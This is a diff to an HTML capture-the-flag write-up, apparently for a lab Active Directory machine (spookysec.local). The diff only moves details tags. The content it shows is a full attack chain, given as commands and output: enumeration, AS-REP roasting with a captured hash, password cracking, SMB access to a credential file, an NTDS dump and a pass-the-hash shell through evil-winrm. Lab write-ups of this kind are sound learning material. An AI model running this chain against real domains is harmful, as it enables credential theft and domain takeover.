@@ -4478,8 +4478,7 @@ sudo apt update <span class="o">&amp;&amp;</span> sudo apt upgrade
 </code></pre></div>
 <h2 id="scan">Scan</h2>
 <p>Scan target with <code>nmap -sC -sV 10.10.12.33</code></p>
-<details class="output"><summary>Nmap output</summary><p>Nmap output:</p>
-<div class="highlight"><pre><span></span><code>Nmap scan report for 10.10.12.33
+<details class="output"><summary>Nmap output</summary><div class="highlight"><pre><span></span><code>Nmap scan report for 10.10.12.33
 Host is up (0.021s latency).
 Not shown: 987 closed ports
 PORT     STATE SERVICE       VERSION
@@ -4527,9 +4526,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.37 seconds
 </code></pre></div>
 </details>
 <p>Enumerate port 139/445 with <code>enum4linux -U -o 10.10.12.33</code></p>
-<details class="output"><summary>enum4linux output</summary></details>
-<p>enum4linux output</p>
-<div class="highlight"><pre><span></span><code>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 19 15:24:22 2021
+<details class="output"><summary>enum4linux output</summary><div class="highlight"><pre><span></span><code>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 19 15:24:22 2021
 
 ==========================
 |    Target Information    |
@@ -4581,9 +4578,9 @@ Use of uninitialized value $global_workgroup in concatenation (.) or string at .
 [E] Couldn&#39;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED
 enum4linux complete on Thu Aug 19 15:24:34 2021
 </code></pre></div>
+</details>
 <p>./kerbrute -domain spookysec.local -dc-ip 10.10.12.33  -users ~/userlist.txt</p>
-<details class="output"><summary>kerbrute output</summary></details>
-<div class="highlight"><pre><span></span><code>Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
+<details class="output"><summary>kerbrute output</summary><div class="highlight"><pre><span></span><code>Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
 
 [*] Valid user =&gt; james
 [*] Valid user =&gt; svc-admin [NOT PREAUTH]
@@ -4612,9 +4609,9 @@ enum4linux complete on Thu Aug 19 15:24:34 2021
 [*] Getting TGT for svc-admin
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fea34e6cdca777efe84cbdeaa48d35b9$cf364f98148fce49cc67dd350754a9c9ccf20dd516b1c2c6aecb6984aba91fca5b386b4ba7b59434f54440ecccdd549533157318a55752abe941976eae78132f61832fba98bc391ee52c51e924cd8d091b6e6d854bc16e769184867024f195936687839c4e63cf54f7a2e1749020c279e3b08f78826ca90deffcda9bdd721a87166fa6e9fe6f68cd493751df05b2ae92a0e5e466f8c674bf16c346e9ee9714f7098369d90dad8e5bac5b4ac316e94ff65acd8914a356450be18b671db831031c6a709369d586d704bc827f2221f3edfd60e5f675fb6ac97570e20bd094362e354b63279e757486c82162d6ae04467d7c1261
 </code></pre></div>
+</details>
 <p>hashcat -a 0 -m 18200 ~/example.hash ~/passwordlist.txt</p>
-<details class="output"><summary>hashcat output</summary></details>
-<div class="highlight"><pre><span></span><code>hashcat (v6.1.1) starting...
+<details class="output"><summary>hashcat output</summary><div class="highlight"><pre><span></span><code>hashcat (v6.1.1) starting...
 
 OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
 =============================================================================================================================
@@ -4669,9 +4666,9 @@ Candidates.#1....: m123456 -&gt; cowgirlup
 Started: 15:44:40
 Stopped: 15:45:18
 </code></pre></div>
+</details>
 <p>smbclient -L \\10.10.12.33 -U svc-admin@spookysec.local</p>
-<details class="output"><summary>smbclient user output</summary></details>
-<div class="highlight"><pre><span></span><code>Enter svc-admin@spookysec.local&#39;s password:
+<details class="output"><summary>smbclient user output</summary><div class="highlight"><pre><span></span><code>Enter svc-admin@spookysec.local&#39;s password:
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -4683,9 +4680,9 @@ Stopped: 15:45:18
         SYSVOL          Disk      Logon server share
 SMB1 disabled -- no workgroup available
 </code></pre></div>
+</details>
 <p>smbclient \\10.10.12.33\backup -U svc-admin@spookysec.local</p>
-<details class="output"><summary>smbclient backup output</summary></details>
-<div class="highlight"><pre><span></span><code>Enter svc-admin@spookysec.local&#39;s password:
+<details class="output"><summary>smbclient backup output</summary><div class="highlight"><pre><span></span><code>Enter svc-admin@spookysec.local&#39;s password:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt; dir
   .                                   D        0  Sat Apr  4 15:08:39 2020
@@ -4695,9 +4692,9 @@ smb: \&gt; dir
                 8247551 blocks of size 4096. 3636330 blocks available
 smb: \&gt; more backup_credentials.txt
 </code></pre></div>
+</details>
 <p>dcode YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</p>
-<details class="output"><summary>dcode backup_credentials.txt</summary></details>
-<div class="highlight"><pre><span></span><code>    __                         __
+<details class="output"><summary>dcode backup_credentials.txt</summary><div class="highlight"><pre><span></span><code>    __                         __
   |/  |                   | / /
   |   | ___  ___  ___  ___|  (
   |   )|___)|    |   )|   )| |___ \   )
@@ -4705,12 +4702,12 @@ smb: \&gt; more backup_credentials.txt
                                     /
 [+] Decoded from Base64 : backup@spookysec.local:backup2517860
 </code></pre></div>
+</details>
 <p>Now that we know this is Base64 we can run this command to read the content: <code>echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d</code></p>
 <p>Running secretsdump.py didn't work for me e.g.:</p>
 <p>secretsdump.py spookysec.local/backup:backup2517860@10.10.12.33 -use-vss</p>
 <p>So i used metasplot und set lhost, SMBDomain, RHOSTS,  SMBPass and SMBUser:</p>
-<details class="output"><summary>metasplot with secretsdump.py</summary></details>
-<div class="highlight"><pre><span></span><code>      =[ metasploit v6.1.0-dev                           ]
+<details class="output"><summary>metasplot with secretsdump.py</summary><div class="highlight"><pre><span></span><code>      =[ metasploit v6.1.0-dev                           ]
 + -- --=[ 2157 exploits - 1146 auxiliary - 367 post       ]
 + -- --=[ 596 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 8 evasion                                       ]
@@ -4824,9 +4821,9 @@ msf6 auxiliary(scanner/smb/impacket/secretsdump) &gt; exploit
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 </code></pre></div>
+</details>
 <p>Secretsdump.py usese the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command: <code>evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</code></p>
-<details class="output"><summary>evil-winrm output and flags</summary></details>
-<div class="highlight"><pre><span></span><code>Evil-WinRM shell v3.2
+<details class="output"><summary>evil-winrm output and flags</summary><div class="highlight"><pre><span></span><code>Evil-WinRM shell v3.2
 
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 
@@ -4839,6 +4836,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\backup\Desktop&gt; more PrivEsc.txt
 *Evil-WinRM* PS C:\Users\svc-admin\Desktop&gt; more user.txt.txt
 </code></pre></div>
+</details>
                 
               
               
